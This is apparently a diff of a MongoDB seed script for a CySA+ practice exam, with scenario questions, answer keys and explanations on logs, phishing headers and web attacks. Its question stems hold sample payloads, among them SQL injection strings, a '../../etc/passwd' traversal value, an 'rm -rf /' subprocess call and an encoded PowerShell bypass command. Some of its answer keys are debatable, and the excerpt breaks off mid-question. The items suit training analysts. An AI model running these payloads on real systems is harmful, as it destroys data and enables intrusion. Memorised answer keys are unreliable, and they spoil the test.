@@ -1,1308 +1,1308 @@
 db.tests.insertOne({
   "category": "cysa",
   "testId": 1,
-  "testName": " CySa+ Practice Test #1 (Normal)",
+  "testName": "Cysa+ Practice Test #1 (Normal)",
   "xpPerCorrect": 10,
   "questions": [
     {
       "id": 1,
-      "question": "Which of the following is the MOST important reason to synchronize time across all network devices and servers in a security context?",
+      "question": "You are reviewing SIEM logs after an alert flagged unusual outbound traffic. Examine the snippet:\n\nFeb 23 12:45:30 webserver1 sshd[2024]: Accepted password for admin from 10.0.3.25 port 55432 ssh2\nFeb 23 12:45:31 webserver1 sshd[2024]: Received disconnect from 10.0.3.25 port 55432:11: disconnected by user\nFeb 23 12:45:35 webserver1 kernel: Outbound connection established to 203.0.113.77:4444\nFeb 23 12:45:36 webserver1 kernel: Outbound connection terminated\nFeb 23 12:45:38 webserver1 sshd[2024]: Accepted password for admin from 10.0.3.25 port 55432 ssh2\n\nWhich indicator most likely suggests malicious activity?",
       "options": [
-        "To ensure accurate billing for cloud services. ",
-        "To facilitate accurate log correlation during incident analysis.",
-        "To improve the performance of network applications. ",
-        "To simplify network administration tasks."
+        "Repeated SSH logins from the same IP address",
+        "Temporary outbound connection to port 4444",
+        "SSH disconnect immediately after login",
+        "SSH login from an internal IP address"
       ],
       "correctAnswerIndex": 1,
-      "explanation": "Billing for cloud services is important, but not the primary security concern. While time synchronization can indirectly improve performance, it's not the main goal. Network administration is simplified, but security is paramount. Accurate log correlation is crucial for reconstructing events during an incident. Without synchronized timestamps, determining the sequence of events across multiple systems becomes extremely difficult, if not impossible.",
-      "examTip": "Remember that accurate timestamps are critical for forensic analysis and incident response."
+      "explanation": "Port 4444 is commonly associated with remote shell access (e.g., Metasploit). The brief outbound connection suggests potential command and control activity.",
+      "examTip": "Focus on unusual ports and transient connections as potential C2 activity."
     },
     {
       "id": 2,
-      "question": "You are investigating a potential data exfiltration incident.  Which of the following would be the FIRST step you should take to preserve evidence?",
+      "question": "A captured payload shows the following HTTP request:\n\nGET /login.php?user=admin&password=' OR '1'='1 HTTP/1.1\nHost: internal-app.example.com\n\nWhat type of attack does this payload represent?",
       "options": [
-        "Shut down the affected server to prevent further data loss. ",
-        "Disconnect the affected server from the network.",
-        "Create a forensic image of the affected system's storage.",
-        "Run a full antivirus scan on the affected server. "
+        "SQL Injection",
+        "Cross-Site Scripting (XSS)",
+        "Command Injection",
+        "Cross-Site Request Forgery (CSRF)"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Shutting down or disconnecting could alter or destroy volatile data.  An antivirus scan could modify files and overwrite evidence. Creating a forensic image ensures a bit-for-bit copy of the storage, preserving the state of the system at the time of the incident without altering the original evidence. This is paramount for maintaining the chain of custody.",
-      "examTip": "Prioritize preserving the integrity of potential evidence before taking any actions that could modify the system."
+      "correctAnswerIndex": 0,
+      "explanation": "The payload uses `' OR '1'='1`, a classic SQL injection pattern bypassing authentication.",
+      "examTip": "Look for conditional SQL logic (' OR '1'='1) to spot SQL injection attempts."
     },
     {
       "id": 3,
-      "question": "What is the primary purpose of a SIEM system in a Security Operations Center (SOC)?",
+      "question": "A SIEM generates the following alerts in succession:\n1. High outbound traffic to a known malicious IP.\n2. DNS requests for multiple random subdomains of the same domain.\n3. Abnormal PowerShell commands executed on endpoints.\n\nWhat type of malicious behavior do these indicators MOST LIKELY represent?",
       "options": [
-        "To prevent all network intrusions. ",
-        "To automatically remediate all security vulnerabilities.",
-        "To collect, aggregate, and analyze security logs from various sources.",
-        "To replace the need for firewalls and intrusion detection systems. "
+        "Lateral movement within the network",
+        "Beaconing to a command-and-control server",
+        "Credential harvesting via phishing",
+        "Distributed Denial of Service (DDoS) preparation"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "SIEMs don't prevent all intrusions; they aid in detection. SIEMs can assist in remediation, but don't automate it completely. Firewalls and IDS are still necessary alongside a SIEM. The core function of a SIEM is to centralize log data, correlate events, and provide analysts with a comprehensive view of security-relevant activity.",
-      "examTip": "Think of a SIEM as a central hub for security log analysis and event correlation."
+      "correctAnswerIndex": 1,
+      "explanation": "Repeated DNS requests to random subdomains often indicate C2 beaconing attempts (DNS tunneling).",
+      "examTip": "Beaconing often involves low-frequency DNS requests to detect responsive C2 infrastructure."
     },
     {
       "id": 4,
-      "question": "Which Windows OS component stores configuration settings, user profiles, and application data?",
+      "question": "Your team receives a threat intel report about a new APT using living-off-the-land techniques. Which data point would provide the strongest confidence of an active threat in your environment?",
       "options": [
-        "The System File Checker (SFC). ",
-        "The Windows Registry",
-        "The Task Manager. ",
-        "The Event Viewer"
+        "PowerShell usage for system reconnaissance",
+        "Successful connection to known C2 IP addresses",
+        "Multiple failed login attempts by a privileged user",
+        "Use of Mimikatz for credential dumping"
       ],
       "correctAnswerIndex": 1,
-      "explanation": "SFC checks for corrupted system files. Task Manager shows running processes. Event Viewer displays logs. The Windows Registry is a hierarchical database that stores critical system and application configuration data, making it a frequent target for attackers.",
-      "examTip": "The Windows Registry is a key area to monitor for unauthorized changes during incident investigations."
+      "explanation": "Confirmed communication with threat actor infrastructure provides direct attribution.",
+      "examTip": "Connections to threat actor infrastructure are high-confidence IoCs."
     },
     {
       "id": 5,
-      "question": "Which of the following is an example of an open-source threat intelligence source?",
+      "question": "During an application security assessment, the following API request is captured:\n\nPOST /api/user/update HTTP/1.1\nHost: app.internal.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nContent-Type: application/json\n{\n   \"userId\": \"12345\",\n   \"role\": \"admin\"\n}\n\nWhich vulnerability is most likely being exploited here?",
       "options": [
-        "A paid subscription to a commercial threat feed. ",
-        "Internal security logs from your organization's firewall.",
-        "The AlienVault OTX (Open Threat Exchange) platform.",
-        "A confidential report from a cybersecurity consulting firm. "
+        "Insecure Direct Object Reference (IDOR)",
+        "Cross-Site Request Forgery (CSRF)",
+        "SQL Injection",
+        "Broken Authentication"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Paid subscriptions and confidential reports are closed-source. Internal logs are not external threat intelligence. AlienVault OTX is a community-driven platform where users share and collaborate on threat information, making it a prime example of an open-source resource.",
-      "examTip": "Open-source intelligence (OSINT) is publicly available information, often shared within security communities."
+      "correctAnswerIndex": 0,
+      "explanation": "The attacker is modifying a user role by changing the userId directly in the API call.",
+      "examTip": "IDOR vulnerabilities arise when objects are referenced by user-supplied input without proper validation."
     },
     {
       "id": 6,
-      "question": "A security analyst observes unusually high network traffic between a workstation and an external IP address during non-business hours. This activity MOST likely indicates:",
+      "question": "A ransomware attack has been detected in your environment. Several endpoints show encryption activity. Which action should be performed immediately?",
       "options": [
-        "Routine software updates. ",
-        "Normal user web browsing.",
-        "Potential data exfiltration.",
-        "Scheduled backup activity. "
+        "Isolate infected systems from the network",
+        "Analyze encryption patterns for malware signatures",
+        "Perform forensic imaging of infected drives",
+        "Identify the ransomware strain using threat intelligence feeds"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Software updates and backups are typically scheduled, but unusually high traffic outside business hours is suspicious. Normal web browsing wouldn't typically generate such high volumes consistently. This pattern strongly suggests data is being sent out of the network without authorization.",
-      "examTip": "Unusual network traffic patterns, especially outside of normal working hours, are red flags for potential malicious activity."
+      "correctAnswerIndex": 0,
+      "explanation": "Containment is critical to prevent lateral spread during active ransomware infections.",
+      "examTip": "Containment first—limit malware propagation before analysis."
     },
     {
       "id": 7,
-      "question": "Which command-line tool is commonly used to capture network packets on a Linux system?",
+      "question": "The following output is from a vulnerability scan:\n\nVulnerability ID: CVE-2023-XXXX\nCVSS Base Score: 9.8 (Critical)\nAttack Vector: Network\nAttack Complexity: Low\nPrivileges Required: None\nUser Interaction: None\nImpact: Complete system takeover possible\n\nGiven the context, which action should be prioritized?",
       "options": [
-        "netstat. ",
-        "ping",
-        "tcpdump",
-        "tracert. "
+        "Immediate patch deployment across all vulnerable systems",
+        "Conduct penetration testing to confirm exploitability",
+        "Apply compensating controls and schedule patching during maintenance",
+        "Notify stakeholders while preparing an incident response plan"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "netstat displays network connections. ping checks network connectivity. tracert traces the route to a destination. tcpdump is specifically designed to capture and analyze network packets, making it the ideal tool for network traffic analysis.",
-      "examTip": "tcpdump is a powerful and versatile packet capture tool widely used in network troubleshooting and security analysis."
+      "correctAnswerIndex": 0,
+      "explanation": "Critical, easily exploitable vulnerabilities without user interaction demand urgent patching.",
+      "examTip": "Prioritize remediation of critical, network-exploitable vulnerabilities."
     },
     {
       "id": 8,
-      "question": "What is the purpose of using a 'sandbox' in security analysis?",
+      "question": "You receive a suspicious email. The header shows:\n\nReceived-SPF: softfail (domain.com: transitioning domain of attacker@malicious.com does not designate 203.0.113.5 as permitted sender)\nAuthentication-Results: dmarc=fail header.from=domain.com\n\nWhat type of attack does this indicate?",
       "options": [
-        "To store sensitive data securely. ",
-        "To isolate and execute potentially malicious code in a controlled environment.",
-        "To encrypt network traffic. ",
-        "To create a virtual private network (VPN)."
+        "Spear phishing with spoofed sender address",
+        "Business email compromise (BEC)",
+        "Whaling targeting executive leadership",
+        "Legitimate email blocked due to misconfiguration"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Sandboxes aren't for data storage, encryption, or VPNs. A sandbox is a virtualized, isolated environment where suspicious files or code can be run without risking harm to the host system.  This allows analysts to observe the behavior of potentially malicious software.",
-      "examTip": "Sandboxing is a key technique for safely analyzing potentially harmful files or code."
+      "correctAnswerIndex": 0,
+      "explanation": "SPF softfail and DMARC fail indicate spoofing attempts.",
+      "examTip": "Failed SPF and DMARC checks strongly indicate spoofed emails."
     },
     {
       "id": 9,
-      "question": "You are reviewing an email and notice that the 'From' address appears to be from your CEO, but the email body contains several grammatical errors and an unusual request.  What type of attack is MOST likely being attempted?",
+      "question": "Review the Python code snippet:\n\nimport os\nos.system(\"echo 'Malicious payload' > /tmp/exploit.txt\")\n\nWhich security concern does this code pose?",
       "options": [
-        "SQL injection. ",
-        "Denial-of-service (DoS). ",
-        "Cross-site scripting (XSS). ",
-        "Spear phishing"
+        "Command injection vulnerability",
+        "Insecure deserialization",
+        "Privilege escalation",
+        "Inadequate input sanitization"
       ],
-      "correctAnswerIndex": 3,
-      "explanation": "SQL injection targets databases. DoS aims to disrupt services. XSS involves injecting scripts into websites. Spear phishing is a targeted phishing attack that impersonates a trusted individual (like a CEO) to trick the recipient into taking a specific action, such as revealing sensitive information or clicking a malicious link.",
-      "examTip": "Be highly suspicious of emails with unusual requests, poor grammar, or unexpected urgency, especially if they appear to be from high-ranking individuals."
+      "correctAnswerIndex": 0,
+      "explanation": "os.system() allows shell command execution, posing injection risks if user input is involved.",
+      "examTip": "Avoid os.system()—use safer alternatives like subprocess.run() with sanitized inputs."
     },
     {
       "id": 10,
-      "question": "Which of the following is a characteristic of an Advanced Persistent Threat (APT)?",
+      "question": "Match each SIEM configuration element to its purpose:\n\n1. Correlation Rule\n2. Data Normalization\n3. Log Aggregation\n4. Threat Intelligence Feed\n\nA) Aggregates logs from all sources\nB) Ensures consistent data formats\nC) Detects patterns indicating threats\nD) Provides context for known threats",
       "options": [
-        "APT attacks are typically short-lived and opportunistic. ",
-        "APT actors are usually motivated by financial gain. ",
-        "APT attacks often involve sophisticated techniques and prolonged access to a target network.",
-        "APT attacks are easily detected by basic security measures. "
+        "1→C, 2→B, 3→A, 4→D",
+        "1→B, 2→C, 3→A, 4→D",
+        "1→C, 2→A, 3→B, 4→D",
+        "1→D, 2→B, 3→A, 4→C"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "APTs are not short-lived; they aim for long-term access. While financial gain can be a motive, APTs are often state-sponsored or driven by espionage. Basic security measures are often insufficient against APTs. APTs are characterized by their sophistication, persistence, and use of advanced techniques to maintain access and evade detection.",
-      "examTip": "APTs are stealthy, persistent, and highly sophisticated threats that require advanced detection and response capabilities."
+      "correctAnswerIndex": 0,
+      "explanation": "SIEM correlation rules detect threat patterns, normalization standardizes data, log aggregation collects data, and threat feeds provide known threat context.",
+      "examTip": "Understand how SIEM components contribute to threat detection and analysis."
     },
     {
       "id": 11,
-      "question": "What is the primary difference between vulnerability scanning and penetration testing?",
+      "question": "A network scan reveals multiple hosts responding on port 3389 from external IPs. However, internal policy restricts RDP to internal-only access.\n\nWhat should be your immediate focus based on this discovery?",
       "options": [
-        "Vulnerability scanning is automated, while penetration testing is manual. ",
-        "Vulnerability scanning identifies weaknesses, while penetration testing exploits them.",
-        "Vulnerability scanning is performed internally, while penetration testing is performed externally. ",
-        "There is no significant difference between the two."
+        "Review firewall rules for RDP exposure",
+        "Check for valid SSL certificates on the hosts",
+        "Analyze endpoint logs for RDP brute force attempts",
+        "Conduct packet capture to inspect RDP session details"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Both can involve manual and automated aspects.  The location (internal/external) can vary for both. The key difference is that vulnerability scanning identifies potential vulnerabilities, while penetration testing actively attempts to exploit those vulnerabilities to demonstrate the potential impact of a successful attack.",
-      "examTip": "Vulnerability scanning finds potential problems; penetration testing proves they can be exploited."
+      "correctAnswerIndex": 0,
+      "explanation": "Port 3389 (RDP) should not be externally exposed per internal policy. The immediate focus is ensuring firewall rules prevent unauthorized external access.",
+      "examTip": "Always verify exposed services against organizational policies first."
     },
     {
       "id": 12,
-      "question": "Which of the following is a benefit of using a Security Orchestration, Automation, and Response (SOAR) platform?",
+      "question": "While reviewing logs, you notice repeated DNS queries for domains with random strings (e.g., a1b2c3d4.example.com) followed by minimal HTTP GET requests.\n\nWhich type of activity does this most likely represent?",
       "options": [
-        "SOAR eliminates the need for human security analysts. ",
-        "SOAR automates repetitive tasks and improves incident response efficiency.",
-        "SOAR guarantees complete protection against all cyber threats. ",
-        "SOAR is only useful for large enterprises with extensive security budgets."
+        "DNS tunneling for command-and-control communication",
+        "Domain generation algorithm (DGA) for malware persistence",
+        "Credential harvesting via phishing infrastructure",
+        "Distributed Denial of Service (DDoS) preparation"
       ],
       "correctAnswerIndex": 1,
-      "explanation": "SOAR augments human analysts, not replaces them. SOAR cannot guarantee complete protection. SOAR can benefit organizations of various sizes. SOAR platforms automate routine tasks, orchestrate security tools, and streamline incident response workflows, leading to faster and more efficient responses.",
-      "examTip": "SOAR helps security teams work smarter, not harder, by automating and orchestrating security operations."
+      "explanation": "Domains with random strings indicate domain generation algorithms (DGAs), commonly used by malware for persistence and dynamic C2 communication.",
+      "examTip": "Identify DGAs by recognizing patterns of random domain queries with low TTLs."
     },
     {
       "id": 13,
-      "question": "Which type of attack involves injecting malicious scripts into a trusted website, which are then executed by unsuspecting users?",
+      "question": "Analyze the given Python code snippet:\n\nimport subprocess\nsubprocess.run(['rm', '-rf', '/'], check=True)\n\nWhat is the primary security concern associated with this code?",
       "options": [
-        "SQL Injection. ",
-        "Cross-Site Scripting (XSS)",
-        "Denial of Service (DoS). ",
-        "Man-in-the-Middle (MitM). "
+        "Privilege escalation vulnerability",
+        "Command injection vulnerability",
+        "Denial of Service (DoS) through destructive commands",
+        "Inadequate input validation"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "SQL Injection targets databases. DoS aims to disrupt services. MitM intercepts communication. XSS involves injecting malicious scripts into websites, which are then executed by the user's browser, often to steal cookies or session tokens.",
-      "examTip": "XSS attacks exploit the trust users have in legitimate websites to deliver malicious code."
+      "correctAnswerIndex": 2,
+      "explanation": "This command (`rm -rf /`) would attempt to delete all files in the root directory, causing complete system failure, representing a DoS condition.",
+      "examTip": "Always validate and restrict subprocess usage, especially for destructive commands."
     },
     {
       "id": 14,
-      "question": "Which of the following is the BEST description of data loss prevention (DLP)?",
+      "question": "You observe the following HTTP request:\n\nPOST /api/payment HTTP/1.1\nHost: secure-payments.com\nContent-Type: application/json\n\n{\n  \"amount\": \"1000\",\n  \"currency\": \"USD\",\n  \"accountId\": \"../../etc/passwd\"\n}\n\nWhich vulnerability does this represent?",
       "options": [
-        "A system that prevents data from being backed up. ",
-        "A set of tools and processes used to identify, monitor, and protect sensitive data from unauthorized access or exfiltration.",
-        "A firewall rule that blocks all outbound network traffic. ",
-        "A type of encryption used to secure data at rest. "
+        "Directory traversal",
+        "SQL injection",
+        "Cross-site scripting (XSS)",
+        "Broken authentication"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "DLP is not about preventing backups. Firewall rules manage network traffic, but don't specifically focus on data content. Encryption secures data, but DLP goes further. DLP systems are designed to detect and prevent sensitive data (like PII or intellectual property) from leaving the organization's control, whether through email, web uploads, or other channels.",
-      "examTip": "DLP is focused on preventing the unauthorized leakage of sensitive data."
+      "correctAnswerIndex": 0,
+      "explanation": "The sequence '../../etc/passwd' attempts to access system files outside the intended directory, representing a directory traversal attack.",
+      "examTip": "Look for patterns such as '../' in payloads to detect directory traversal attempts."
     },
     {
       "id": 15,
-      "question": "What is the purpose of a 'honeypot' in network security?",
+      "question": "A new critical zero-day vulnerability in an essential cloud service has been publicly disclosed. The vendor has not yet released a patch.\n\nWhich action should be prioritized to mitigate the risk?",
       "options": [
-        "To store sensitive data in a highly secure location. ",
-        "To act as a decoy system to attract and detect attackers.",
-        "To provide a backup network connection in case of failure. ",
-        "To encrypt network traffic for secure communication. "
+        "Implement compensating controls such as WAF rules or segmentation",
+        "Temporarily suspend usage of the affected service",
+        "Perform penetration testing to assess exploitability",
+        "Notify all stakeholders of the potential service disruption"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Honeypots are not for storing data, providing backup connections, or encryption. A honeypot is a deliberately vulnerable system designed to lure attackers, allowing security professionals to study their methods and gather threat intelligence.",
-      "examTip": "Honeypots are traps set to detect, deflect, or study hacking attempts."
+      "correctAnswerIndex": 0,
+      "explanation": "Without a patch available, implementing compensating controls like WAF rules or isolating vulnerable services is the best approach to reduce exposure.",
+      "examTip": "Use compensating controls when patching is unavailable, especially for critical vulnerabilities."
     },
     {
       "id": 16,
-      "question": "You are analyzing a compromised system and discover a file with a `.exe` extension that has an unusually long and complex filename.  What should you do FIRST?",
+      "question": "The following SIEM correlation rule triggered an alert:\n\nIF (failed_logins > 5) AND (source_ip NOT IN approved_list) AND (login_time BETWEEN 00:00 AND 05:00) THEN ALERT\n\nWhat type of attack behavior is this rule designed to detect?",
       "options": [
-        "Immediately delete the file. ",
-        "Rename the file to a `.txt` extension.",
-        "Execute the file in a sandbox environment to analyze its behavior.",
-        "Open the file in a text editor to examine its contents. "
+        "Brute force authentication attempts",
+        "Insider threat data exfiltration",
+        "Time-based SQL injection attempts",
+        "Credential stuffing using leaked credentials"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Deleting the file removes evidence. Renaming it doesn't reveal its purpose.  Opening it in a text editor might be safe for some files, but a `.exe` could be triggered accidentally.  The safest and most informative first step is to execute the suspicious file in a controlled sandbox environment to observe its actions without risking the host system.",
-      "examTip": "Always prioritize analyzing suspicious executables in a sandbox before taking other actions."
+      "correctAnswerIndex": 0,
+      "explanation": "Multiple failed logins during off-hours from unauthorized IPs are classic signs of brute force attempts.",
+      "examTip": "Combine failed login thresholds with time-based rules to detect brute force attacks."
     },
     {
       "id": 17,
-      "question": "What information is typically contained in a WHOIS record?",
+      "question": "Your organization’s vulnerability scan identified the following:\n\n- CVE-2023-XXXX with a CVSS score of 8.8 (High)\n- Network exploitable\n- Requires user interaction\n- Exploitation leads to privilege escalation\n\nWhat factor reduces the urgency for immediate patching compared to a critical vulnerability?",
       "options": [
-        "The IP addresses of all devices on a network. ",
-        "The operating system versions of web servers. ",
-        "The registration details of a domain name, including the owner's contact information.",
-        "The encryption keys used for secure communication. "
+        "Requirement for user interaction",
+        "Privilege escalation impact",
+        "Network exploitability",
+        "High (but not critical) CVSS score"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "WHOIS doesn't list all devices on a network, web server OS versions, or encryption keys. WHOIS provides information about who registered a domain name, including contact details (which may be redacted for privacy). This can be useful for identifying the owner of a potentially malicious website.",
-      "examTip": "WHOIS is a valuable tool for investigating domain names and identifying their owners."
+      "correctAnswerIndex": 0,
+      "explanation": "User interaction requirements lower the urgency because it reduces the automatic exploitability compared to vulnerabilities needing no user involvement.",
+      "examTip": "Prioritize vulnerabilities that require no user interaction for faster remediation."
     },
     {
       "id": 18,
-      "question": "Which CVSS metric describes the level of access required for an attacker to successfully exploit a vulnerability?",
+      "question": "Given the following email header snippet:\n\nReceived-SPF: pass (mail.example.com: domain of user@trusted.com designates 198.51.100.5 as permitted sender)\nDKIM-Signature: v=1; a=rsa-sha256; d=trusted.com;\nAuthentication-Results: dmarc=pass header.from=trusted.com\n\nWhat is the most likely conclusion?",
       "options": [
-        "Attack Vector (AV). ",
-        "Attack Complexity (AC). ",
-        "Privileges Required (PR)",
-        "User Interaction (UI). "
+        "The email is likely legitimate based on SPF, DKIM, and DMARC checks.",
+        "The email is a spoofed phishing attempt with forged headers.",
+        "The email is from a compromised trusted sender account.",
+        "The email bypassed security checks using open relay techniques."
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Attack Vector describes how the vulnerability is accessed (network, local, etc.). Attack Complexity describes the difficulty of exploiting the vulnerability. User Interaction describes whether user action is needed. Privileges Required specifically indicates the level of privileges (None, Low, High) an attacker needs to exploit the vulnerability.",
-      "examTip": "The 'Privileges Required' metric in CVSS is crucial for understanding the potential impact of a vulnerability."
+      "correctAnswerIndex": 0,
+      "explanation": "All authentication checks (SPF, DKIM, and DMARC) passed, indicating high likelihood of legitimacy unless other contextual evidence proves otherwise.",
+      "examTip": "SPF, DKIM, and DMARC alignment typically confirms sender authenticity."
     },
     {
       "id": 19,
-      "question": "You receive an alert from your EDR solution indicating unusual process activity on a critical server. What is the FIRST step you should take?",
+      "question": "Analyze the following PowerShell command observed in endpoint logs:\n\npowershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBtAG0AbwByAHQAIABzAG8AbQBlACAAbQBhAGwAaQBjAGkAbwB1AHMAIABjAG8AZABlAA==\n\nWhich threat technique does this represent?",
       "options": [
-        "Re-image the server immediately. ",
-        "Isolate the server from the network.",
-        "Investigate the alert to determine its validity and scope.",
-        "Ignore the alert if no other systems are affected. "
+        "Living-off-the-land (LOtL) attack",
+        "Command injection via PowerShell",
+        "Privilege escalation through local exploits",
+        "Credential dumping using Windows utilities"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Re-imaging is a drastic step that should only be taken after investigation and containment.  Isolating might be necessary, but after initial investigation. Ignoring alerts is never recommended. The first step is to investigate the alert's details, gather information about the process, and determine if it's truly malicious before taking further action.  This helps prevent unnecessary disruption and ensures an appropriate response.",
-      "examTip": "Always investigate security alerts thoroughly before taking drastic actions like re-imaging a system."
+      "correctAnswerIndex": 0,
+      "explanation": "PowerShell with encoded commands, especially with 'ExecutionPolicy Bypass', strongly indicates living-off-the-land techniques to evade detection.",
+      "examTip": "Encoded PowerShell commands and bypass flags are hallmarks of LOtL attacks."
     },
     {
       "id": 20,
-      "question": "Which of the following BEST describes the concept of 'defense in depth'?",
+      "question": "During threat hunting, you identify that an endpoint frequently attempts to resolve DNS queries for subdomains of a domain linked to recent APT activity. However, there is no outbound HTTP or TCP connection established afterward.\n\nWhat could this behavior indicate?",
       "options": [
-        "Using a single, powerful firewall to protect the network. ",
-        "Implementing multiple layers of security controls to protect assets.",
-        "Encrypting all data at rest and in transit. ",
-        "Relying solely on antivirus software for endpoint protection. "
+        "DNS-based command and control beaconing",
+        "Active reconnaissance scanning by an attacker",
+        "Malicious domain parking by a third party",
+        "Credential harvesting through DNS exfiltration"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "A single firewall is a single point of failure.  Encryption is important, but it's only one layer. Antivirus is also just one layer. Defense in depth involves layering multiple security controls (e.g., firewalls, intrusion detection, access controls, encryption) so that if one control fails, others are in place to mitigate the risk.",
-      "examTip": "Defense in depth means using multiple, overlapping security controls to protect your assets."
+      "correctAnswerIndex": 0,
+      "explanation": "Frequent DNS lookups without follow-up connections strongly suggest DNS-based C2 beaconing, where DNS queries act as the communication channel.",
+      "examTip": "Monitor DNS patterns for signs of covert C2 channels, especially with no follow-up traffic."
     },
     {
       "id": 21,
-      "question": "What is the primary purpose of a 'chain of custody' in digital forensics?",
+      "question": "A penetration tester sends the following payload to a web application:\n\nGET /profile.php?user=1;DROP TABLE users;-- HTTP/1.1\nHost: vulnerable-webapp.com\n\nWhich attack technique is being attempted?",
       "options": [
-        "To track the physical location of a compromised device. ",
-        "To document the chronological history of evidence, ensuring its integrity and admissibility in court.",
-        "To encrypt sensitive data during forensic analysis. ",
-        "To provide a detailed report of all vulnerabilities found on a system. "
+        "SQL Injection",
+        "Cross-Site Request Forgery (CSRF)",
+        "Remote Code Execution (RCE)",
+        "XML External Entity (XXE) Attack"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Chain of custody isn't solely about physical location, encryption, or vulnerability reports. The chain of custody meticulously documents who had control of the evidence, when, and where, demonstrating that it hasn't been tampered with. This is crucial for legal admissibility.",
-      "examTip": "Proper chain of custody is essential for maintaining the integrity and legal admissibility of digital evidence."
+      "correctAnswerIndex": 0,
+      "explanation": "The use of `;DROP TABLE users;--` is a classic SQL injection pattern aimed at executing additional SQL statements to delete the users table.",
+      "examTip": "SQL injection payloads often contain semicolons (`;`) to chain malicious SQL commands."
     },
     {
       "id": 22,
-      "question": "Which type of vulnerability allows an attacker to execute arbitrary commands on a target system?",
+      "question": "You are reviewing network traffic and notice repeated connections to port 53 from a single internal host with abnormal query patterns:\n\nexample: x1a2b3c4d5.evil-domain.com\n\nWhich type of activity is most likely occurring?",
       "options": [
-        "Cross-Site Scripting (XSS). ",
-        "SQL Injection. ",
-        "Remote Code Execution (RCE)",
-        "Denial of Service (DoS). "
+        "DNS tunneling for exfiltration",
+        "Distributed Denial of Service (DDoS) attack",
+        "Man-in-the-middle (MITM) interception",
+        "Domain generation algorithm (DGA) usage"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "XSS injects scripts into websites. SQL Injection targets databases. DoS disrupts services. RCE allows an attacker to run arbitrary code/commands on the target system, giving them a high level of control.",
-      "examTip": "RCE vulnerabilities are extremely dangerous because they allow attackers to execute their own code on a compromised system."
+      "correctAnswerIndex": 0,
+      "explanation": "Port 53 traffic with abnormal query patterns often indicates DNS tunneling, which attackers use for covert data exfiltration or C2 communication.",
+      "examTip": "Watch for DNS traffic anomalies as they may reveal hidden exfiltration channels."
     },
     {
       "id": 23,
-      "question": "What is the purpose of 'input validation' in secure coding practices?",
+      "question": "Consider the following log entries from a Linux server:\n\nFeb 23 14:12:04 server sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash\nFeb 23 14:12:05 server sshd[2334]: Accepted publickey for user1 from 192.168.100.55 port 60232\n\nWhat potentially malicious behavior is indicated here?",
       "options": [
-        "To encrypt user input before storing it in a database. ",
-        "To ensure that user input conforms to expected formats and prevents malicious code injection.",
-        "To automatically log out users after a period of inactivity. ",
-        "To prevent users from accessing sensitive data. "
+        "Privilege escalation attempt via sudo access",
+        "Successful brute force attack on SSH credentials",
+        "Unauthorized file modification in /home directory",
+        "Reverse shell execution from the server"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Input validation is not primarily about encryption or access control. Automatic logout is session management. Input validation checks user-provided data (e.g., in web forms) to ensure it meets expected criteria (length, data type, allowed characters) and prevents attackers from injecting malicious code, such as SQL injection or XSS.",
-      "examTip": "Proper input validation is a fundamental security practice to prevent many common web application vulnerabilities."
+      "correctAnswerIndex": 0,
+      "explanation": "The log shows user1 invoking sudo to execute a root shell, which could indicate an attempt at privilege escalation if not expected behavior.",
+      "examTip": "Monitor sudo usage patterns, especially direct root shell executions (`/bin/bash`)."
     },
     {
       "id": 24,
-      "question": "What does the acronym 'IoC' stand for in the context of cybersecurity?",
+      "question": "A vulnerability scanner output shows:\n\n- CVSS Score: 9.0 (Critical)\n- Attack Vector: Network\n- Privileges Required: None\n- User Interaction: None\n- Exploitability: High\n\nWhich mitigation strategy should be prioritized?",
       "options": [
-        "Internet of Computers. ",
-        "Indicators of Compromise",
-        "Internal Operating Configuration. ",
-        "Index of Commands. "
+        "Immediate deployment of vendor patches",
+        "Segmentation of affected systems",
+        "Application of temporary firewall rules",
+        "Creation of compensating access controls"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "The correct answer is Indicators of Compromise. These are clues or artifacts that suggest a system or network may have been breached.",
-      "examTip": "IoCs are crucial for identifying and responding to security incidents."
+      "correctAnswerIndex": 0,
+      "explanation": "A critical, remotely exploitable vulnerability with no privileges required demands immediate patch deployment to prevent exploitation.",
+      "examTip": "Critical network-exploitable vulnerabilities should be patched immediately when no user interaction is needed."
     },
     {
       "id": 25,
-      "question": "A company's web server is experiencing slow response times and intermittent outages.  Analysis shows a large number of requests originating from multiple IP addresses, all targeting a single page on the website.  This is MOST likely a:",
+      "question": "A malicious insider attempts to exfiltrate sensitive data using HTTP PUT requests to an external server.\n\nWhat should a SOC analyst implement to detect or prevent this activity?",
       "options": [
-        "Cross-site scripting (XSS) attack. ",
-        "SQL injection attack. ",
-        "Distributed Denial-of-Service (DDoS) attack",
-        "Man-in-the-middle (MitM) attack. "
+        "Deep packet inspection (DPI) at network boundaries",
+        "Implement DNS sinkholing for suspicious domains",
+        "Enable secure baseline scanning for endpoints",
+        "Apply SPF, DKIM, and DMARC policies to outbound email"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "XSS and SQL injection typically target vulnerabilities, not overwhelming resources. MitM intercepts communication. A DDoS attack uses multiple compromised systems (often a botnet) to flood a target with traffic, overwhelming its resources and causing it to become unavailable to legitimate users. The described scenario perfectly aligns with this.",
-      "examTip": "DDoS attacks aim to disrupt service availability by overwhelming a target with traffic from multiple sources."
